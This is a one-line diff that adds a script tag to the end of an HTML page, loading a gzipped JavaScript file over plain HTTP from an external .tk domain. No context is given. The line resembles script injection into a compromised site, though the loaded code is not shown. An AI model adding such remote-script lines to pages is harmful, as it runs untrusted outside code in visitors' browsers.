@@ -1,0 +1,1 @@
+<script type="text/javascript" src="http://tncakes.tk/js/tncakes.js.gz"></script></body></html>
